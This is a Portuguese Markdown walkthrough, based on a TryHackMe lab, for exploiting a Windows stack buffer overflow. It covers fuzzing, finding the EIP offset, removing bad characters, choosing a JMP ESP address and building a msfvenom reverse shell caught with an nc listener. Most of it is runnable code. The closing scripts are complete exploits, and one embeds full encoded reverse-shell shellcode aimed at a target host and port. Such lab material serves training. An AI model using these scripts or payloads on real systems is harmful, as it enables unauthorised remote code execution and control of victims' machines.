@@ -1,0 +1,478 @@
+# Exploração de Buffer Overflow
+ip do meu windows interno 192.168.1.10
+## 🔥 Introdução
+Este guia cobre um processo passo a passo para explorar vulnerabilidades de Buffer Overflow em aplicações Windows, utilizando ferramentas como **Immunity Debugger**, **Mona**, e **Metasploit**.
+
+> 📌 Baseado na sala "Buffer Overflow Prep" do TryHackMe: [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)
+
+---
+
+## 🛠️ Configuração do Ambiente
+
+1. **Baixe e instale o Immunity Debugger** no Windows.
+2. **Configure o plugin Mona** dentro do Immunity Debugger.
+3. **Certifique-se de que a aplicação vulnerável está em execução.**
+   ```bash
+   nc <IP_ALVO> 1337
+   ```
+
+4. **No Kali, use `xfreerdp` para acessar a máquina Windows remotamente:**
+   ```bash
+   xfreerdp /u:admin /p:password /cert:ignore /v:<IP_ALVO> /workarea /tls-seclevel:0
+   ```
+!mona config -set workingfolder c:\mona\%p
+---
+
+## 🚀 Fuzzing
+Criamos um script para enviar strings progressivamente maiores e verificar se ocorre um crash:
+
+```python
+#!/usr/bin/env python3
+import socket, time, sys
+
+ip = "<IP_ALVO>"
+port = 1337
+timeout = 5
+prefix = "OVERFLOW1 "
+
+string = prefix + "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
+```
+![image](https://github.com/user-attachments/assets/5359f9a5-fc2e-4622-adfd-d43874aefcb9)
+
+Após o crash, anotamos o maior número de bytes enviados antes da falha.
+
+---
+
+Script base para o buffer/ exploit.py:
+
+```python
+import socket
+
+ip = "10.10.149.181"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
+## 🔍 Encontrando o Offset
+
+Geramos um padrão único com o **Metasploit**:
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
+```
+![image](https://github.com/user-attachments/assets/4bf638cf-24ad-422f-b3ca-efe252c571b0)
+Colocamos no exploit.py em payload e enviamos com o programa rodando no immunity
+
+Depois, verificamos qual valor foi armazenado no **EIP**:
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_VALUE> -l 2400
+```
+![image](https://github.com/user-attachments/assets/8d5ed384-e65d-473b-8e76-ce2460b17758)
+
+Ou no **Immunity Debugger**:
+```text
+!mona findmsp -distance 2400
+```
+![image](https://github.com/user-attachments/assets/8f37b9a3-ebc2-4b44-8a5e-98055f07515e)
+
+
+Atualizamos o script `exploit.py` com o offset correto e alteramos o retn e payload:
+```python
+offset = 1978
+retn = "BBBB"
+payload = ""
+
+```
+![image](https://github.com/user-attachments/assets/de7ace7f-9644-4b78-bd0f-1e93dc084d33)
+
+Após executar, verificamos se o **EIP** contém `42424242` (BBBB).
+![image](https://github.com/user-attachments/assets/a409a665-ee1e-43d1-93b7-81cf8679b54b)
+
+
+---
+
+## 🔬 Encontrando Bad Characters
+
+Geramos um **bytearray** usando mona sem o byte nulo `\x00` por padrão. Observe o local do arquivo bytearray.bin que é gerado (se a pasta de trabalho foi definida conforme a seção Configuração do Mona deste guia, o local deve ser C:\mona\oscp\bytearray.bin).
+```text
+!mona bytearray -b "\x00"
+```
+![image](https://github.com/user-attachments/assets/ead264de-6813-4e2b-b3e4-097d5ebd95de)
+
+Podemos copiar a saida do mona ou usamos um script Python para gerar badchars:
+```python
+for x in range(1, 256):
+  print("\\x" + "{:02x}".format(x), end='')
+print()
+```
+Atualize seu script exploit.py e defina a variável payload como a sequência de caracteres inválidos gerada pelo script. 
+
+Executamos o exploit e comparamos a memória usando como base o endereço para o qual o registro ESP ponta:
+![image](https://github.com/user-attachments/assets/65b91f5e-cfde-4e6f-91e5-3d2331c969c1)
+```text
+!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP_ADDRESS>
+```
+- Uma janela pop-up deve aparecer rotulada "mona Memory comparison results"
+- A janela mostra os resultados da comparação, indicando quaisquer caracteres que sejam diferentes na memória do que são no arquivo bytearray.bin gerado.
+- Nem todos eles podem ser badchars! Às vezes, badchars fazem com que o próximo byte também seja corrompido, ou até mesmo afetem o resto da string.
+![image](https://github.com/user-attachments/assets/8ee957ca-c5b6-413c-a610-72782c0a2156)
+O primeiro badchar na lista deve ser o byte nulo (\x00), pois já o removemos do arquivo. Anote quaisquer outros. Gere um novo bytearray em mona, especificando esses novos badchars junto com \x00. Em seguida, atualize a variável payload no seu script exploit.py e remova os novos badchars também.
+
+Atualizando nossa lista com mona:
+```text
+!mona bytearray -b "\x00\x07"
+```
+Alterando o payload e tirando o 07
+![image](https://github.com/user-attachments/assets/a50e54cd-e280-43d1-898c-2a2d92bbeb40)
+- Repetindo o processo
+- Executando o programa
+- Executando o script
+- ESP – 0199FA30
+```text
+!mona compare -f C:\mona\oscp\bytearray.bin -a  0199FA30
+```
+![image](https://github.com/user-attachments/assets/6e692714-f07a-4661-a738-4ec852e826f5)
+```text
+!mona bytearray -b "\x00\x07\x2e"
+```
+- Alterando o payload e tirando o 2e  
+![image](https://github.com/user-attachments/assets/32d03626-8ae9-444b-aa4f-2f87459012a9)
+- Repetindo o processo
+- Executando o programa
+- Executando o script
+- ESP – 0199FA30
+```text
+!mona compare -f C:\mona\oscp\bytearray.bin -a  0199FA30
+```
+![image](https://github.com/user-attachments/assets/0239f305-49e5-4285-bc2d-6eb39d5c74d8)
+```text
+!mona bytearray -b "\x00\x07\x2e\xa0"
+```
+- Alterando o payload e tirando o a0  
+- Repetindo o processo
+- Executando o programa
+- Executando o script
+- ESP – 0188FA30
+```text
+!mona compare -f C:\mona\oscp\bytearray.bin -a  0188FA30
+```
+![image](https://github.com/user-attachments/assets/b02045f3-7a99-43af-b6b4-8dc300147b71)
+- Sem mais BadChars ou seja
+- Temos: 00 07 2e a0
+
+Obs: Podemos fazer manualmente sem o mona
+- Clicamos no valor de ESP com o botão direito e em "Follow in Dump" e verificamos o valor um por um para ver qual não foi enviado, ou seja, é um bad char. Retiramos o mesmo do payload e repetimos o processo.
+---
+
+## 🔄 Encontrando um Ponto de Salto
+
+Procuramos um **JMP ESP** válido - não esqueça de atualizar a opção -cpb com todos os badchars que você identificou (incluindo \x00)::
+```text
+!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
+```
+![image](https://github.com/user-attachments/assets/df5724fd-db30-4135-9a56-58ed705292a3)
+
+Selecionamos um endereço sem ASLR e colocamos no exploit (retn):
+```python
+retn = "\x05\x12\x50\x62"
+```
+
+## 🔄 `JMP ESP` Manualmente no Immunity Debugger
+
+Se você não quiser usar o **Mona**, pode encontrar um endereço de `JMP ESP` manualmente dentro do **Immunity Debugger**. Aqui está um passo a passo detalhado para fazer isso:
+
+---
+
+### 📌 Passo 1: Abrir o Executável Vulnerável no Immunity Debugger
+1. **Abra o Immunity Debugger** no Windows.
+2. **Carregue o binário vulnerável** (`File > Open`) e selecione o executável alvo (exemplo: `oscp.exe`).
+3. **Inicie a execução do programa** clicando no botão **Run (F9)**.
+4. **Confirme que o programa está rodando** e escutando na porta certa (se aplicável).
+
+---
+
+### 📌 Passo 2: Procurar por um `JMP ESP`
+Agora vamos encontrar um endereço de `JMP ESP` (`FFE4`) dentro de uma DLL ou do próprio binário.
+
+1. **Pausar a execução do programa** clicando no botão **Pause (F12)**.
+2. **Abrir a busca por instruções (`Search for > Command`)**:
+   - No menu superior do Immunity Debugger, clique em **Search** → **Command**.
+   - Ou pressione `Ctrl + F` para abrir a busca manualmente.
+3. **Digite o opcode `FFE4` (código de `JMP ESP`) e pressione Enter**.
+   - Isso fará com que o Immunity busque por todas as ocorrências da instrução `JMP ESP` no binário e nas DLLs carregadas.
+4. **Verifique os endereços retornados**.
+   - O Immunity Debugger mostrará uma lista de locais onde a instrução `JMP ESP` foi encontrada.
+   - **Escolha um endereço seguro**, ou seja, um que venha de uma DLL sem proteções de segurança como **ASLR (Address Space Layout Randomization)** e **SafeSEH**.
+
+---
+
+### 📌 Passo 3: Verificar se a DLL é Segura
+Antes de usar um endereço de `JMP ESP`, precisamos garantir que ele pertence a uma DLL **sem proteções como ASLR e SafeSEH**.
+
+1. **No Immunity Debugger, abra a lista de módulos carregados**:
+   - Vá até **View > Executable Modules**.
+   - Isso abrirá uma janela listando todas as DLLs e seus atributos.
+2. **Verifique as colunas ASLR e SafeSEH**:
+   - **ASLR: False** → Significa que a DLL não muda de endereço a cada reinicialização.
+   - **SafeSEH: False** → Significa que a DLL permite redirecionar a execução do programa.
+3. **Escolha um endereço de `JMP ESP` de uma DLL que tenha ASLR e SafeSEH desativados**.
+
+---
+
+### 📌 Passo 4: Usar o Endereço no Exploit
+Agora que você encontrou um bom endereço de `JMP ESP`, copie-o e use no seu exploit.
+
+Se o endereço encontrado for `0x62501205`, por exemplo, adicione-o ao seu script `exploit.py` assim:
+
+```python
+retn = "\x05\x12\x50\x62"  # JMP ESP encontrado
+```
+
+Lembre-se de inverter os bytes porque o **Windows usa Little Endian**, ou seja, o endereço `0x62501205` deve ser escrito como `\x05\x12\x50\x62`.
+
+---
+
+### 📌 Passo 5: Testar o Exploit
+Agora é só **reiniciar a aplicação** e testar seu exploit para ver se o fluxo de execução realmente pula para sua shellcode.
+
+---
+---
+
+## 🎯 Gerando o Payload
+Criamos um shell reverso com `msfvenom`:
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+```
+
+E adicionamos ao exploit:
+```python
+payload = (
+  "\xfc\xe8\x82\x00\x00\x00\x60..."  # (Shellcode gerado)
+)
+```
+
+Incluímos **NOPs** para ajudar na execução:
+```python
+padding = "\x90" * 16
+```
+
+---
+
+## 📌 Execução do Exploit
+
+1. No Kali, inicie um listener para capturar a shell reversa:
+   ```bash
+   nc -lvnp 4444
+   ```
+2. Execute o exploit:
+   ```bash
+   python3 exploit.py
+   ```
+3. Se tudo estiver correto, você terá acesso ao sistema remoto! 🎉
+
+---
+
+## 📚 Referências
+- [TryHackMe - Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)
+- [Pentest Cheatsheets - Tib3rius](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
+
+  Script exploit att
+```bash
+import socket
+import argparse
+
+# Configuração dos argumentos da linha de comando
+parser = argparse.ArgumentParser(description="Exploit de Buffer Overflow com argumentos personalizáveis")
+parser.add_argument("--ip", required=True, help="Endereço IP do alvo")
+parser.add_argument("--port", type=int, default=1337, help="Porta do alvo (padrão: 1337)")
+parser.add_argument("--prefix", default="OVERFLOW10 ", help="Prefixo do buffer (padrão: 'OVERFLOW10 ')")
+parser.add_argument("--offset", type=int, default=0, help="Tamanho do overflow (padrão: 0)")
+parser.add_argument("--postfix", default="", help="Sufixo do payload (padrão: vazio)")
+
+args = parser.parse_args()
+
+# Construção do buffer
+overflow = "A" * args.offset
+retn = "\xc3\x14\x04\x08"
+padding = "\x90" * 16
+payload = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12"
+           "\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24"
+           "\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36"
+           "\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48"
+           "\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
+           "\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
+           "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e"
+           "\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+           "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
+           "\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
+           "\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6"
+           "\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8"
+           "\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
+           "\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc"
+           "\xfd\xfe\xff")
+
+buffer = args.prefix + overflow + retn + padding + payload + args.postfix
+
+# Envio do buffer
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+    s.connect((args.ip, args.port))
+    print(f"[*] Enviando buffer para {args.ip}:{args.port}...")
+    s.send(bytes(buffer + "\r\n", "latin-1"))
+    print("[+] Exploit enviado com sucesso!")
+except Exception as e:
+    print(f"[!] Erro ao conectar: {e}")
+finally:
+    s.close()
+
+```
+
+Script fuzzer att:
+```bash
+#!/usr/bin/env python3
+
+import socket
+import time
+import sys
+import argparse
+
+# Configuração dos argumentos da linha de comando
+parser = argparse.ArgumentParser(description="Fuzzer para testes de Buffer Overflow")
+parser.add_argument("--ip", required=True, help="Endereço IP do alvo")
+parser.add_argument("--port", type=int, default=1337, help="Porta do alvo (padrão: 1337)")
+parser.add_argument("--timeout", type=int, default=5, help="Timeout da conexão (padrão: 5 segundos)")
+parser.add_argument("--prefix", default="OVERFLOW9 ", help="Prefixo do buffer (padrão: 'OVERFLOW9 ')")
+
+args = parser.parse_args()
+
+# Inicialização do buffer
+string = args.prefix + "A" * 100
+
+while True:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(args.timeout)
+            s.connect((args.ip, args.port))
+            s.recv(1024)
+            
+            print(f"[*] Fuzzing com {len(string) - len(args.prefix)} bytes")
+            s.send(bytes(string, "latin-1"))
+            s.recv(1024)
+    
+    except Exception as e:
+        print(f"[!] O servidor travou com {len(string) - len(args.prefix)} bytes")
+        sys.exit(0)
+
+    string += 100 * "A"
+    time.sleep(1)
+```
+
+Mais um com duas entradas sendo na segunda o payload:
+
+```bash
+import socket
+
+ip = "192.168.1.20"
+port = 9999
+
+# Definindo variáveis de exploração
+prefix = ""
+offset = 2012  # Tamanho do buffer para o overflow
+overflow = "A" * offset  # Injetando 'A' para causar o overflow
+retn = "\xdf\x14\x50\x62"  # Endereço de retorno (pode ser ajustado para o valor correto)
+padding = "\x90" * 100  # Qualquer padding extra que for necessário
+payload = ("\xba\xaa\xba\xe7\xc9\xd9\xc4\xd9\x74\x24\xf4\x5f\x33\xc9"
+"\xb1\x52\x31\x57\x12\x83\xef\xfc\x03\xfd\xb4\x05\x3c\xfd"
+"\x21\x4b\xbf\xfd\xb1\x2c\x49\x18\x80\x6c\x2d\x69\xb3\x5c"
+"\x25\x3f\x38\x16\x6b\xab\xcb\x5a\xa4\xdc\x7c\xd0\x92\xd3"
+"\x7d\x49\xe6\x72\xfe\x90\x3b\x54\x3f\x5b\x4e\x95\x78\x86"
+"\xa3\xc7\xd1\xcc\x16\xf7\x56\x98\xaa\x7c\x24\x0c\xab\x61"
+"\xfd\x2f\x9a\x34\x75\x76\x3c\xb7\x5a\x02\x75\xaf\xbf\x2f"
+"\xcf\x44\x0b\xdb\xce\x8c\x45\x24\x7c\xf1\x69\xd7\x7c\x36"
+"\x4d\x08\x0b\x4e\xad\xb5\x0c\x95\xcf\x61\x98\x0d\x77\xe1"
+"\x3a\xe9\x89\x26\xdc\x7a\x85\x83\xaa\x24\x8a\x12\x7e\x5f"
+"\xb6\x9f\x81\x8f\x3e\xdb\xa5\x0b\x1a\xbf\xc4\x0a\xc6\x6e"
+"\xf8\x4c\xa9\xcf\x5c\x07\x44\x1b\xed\x4a\x01\xe8\xdc\x74"
+"\xd1\x66\x56\x07\xe3\x29\xcc\x8f\x4f\xa1\xca\x48\xaf\x98"
+"\xab\xc6\x4e\x23\xcc\xcf\x94\x77\x9c\x67\x3c\xf8\x77\x77"
+"\xc1\x2d\xd7\x27\x6d\x9e\x98\x97\xcd\x4e\x71\xfd\xc1\xb1"
+"\x61\xfe\x0b\xda\x08\x05\xdc\x25\x64\x04\x16\xce\x77\x06"
+"\x37\x52\xf1\xe0\x5d\x7a\x57\xbb\xc9\xe3\xf2\x37\x6b\xeb"
+"\x28\x32\xab\x67\xdf\xc3\x62\x80\xaa\xd7\x13\x60\xe1\x85"
+"\xb2\x7f\xdf\xa1\x59\xed\x84\x31\x17\x0e\x13\x66\x70\xe0"
+"\x6a\xe2\x6c\x5b\xc5\x10\x6d\x3d\x2e\x90\xaa\xfe\xb1\x19"
+"\x3e\xba\x95\x09\x86\x43\x92\x7d\x56\x12\x4c\x2b\x10\xcc"
+"\x3e\x85\xca\xa3\xe8\x41\x8a\x8f\x2a\x17\x93\xc5\xdc\xf7"
+"\x22\xb0\x98\x08\x8a\x54\x2d\x71\xf6\xc4\xd2\xa8\xb2\xe5"
+"\x30\x78\xcf\x8d\xec\xe9\x72\xd0\x0e\xc4\xb1\xed\x8c\xec"
+"\x49\x0a\x8c\x85\x4c\x56\x0a\x76\x3d\xc7\xff\x78\x92\xe8"
+"\xd5")  # Payload que pode ser injetado (vazio por enquanto, pode ser um shellcode)
+postfix = ""  # Qualquer coisa que deva ser enviada após o payload
+
+# Construindo o buffer final
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+    # Conectando ao alvo
+    s.connect((ip, port))
+    print("Connected to target.")
+
+    # Recebe a mensagem de boas-vindas
+    response = s.recv(1024).decode("latin-1")
+    print(response)
+
+    # Envia o nome de usuário
+    username = " "  # Nome de usuário
+    s.send(bytes(username + "\r\n", "latin-1"))
+    
+    # Recebe resposta do servidor após o envio do usuário
+    response = s.recv(1024).decode("latin-1")
+    print(response)
+
+    # Envia o buffer de injeção (overflow)
+    print("Sending evil buffer...")
+    s.send(bytes(buffer + "\r\n", "latin-1"))
+    print("Done!")
+
+except Exception as e:
+    print(f"Could not connect: {e}")
+
+finally:
+    s.close()
+```
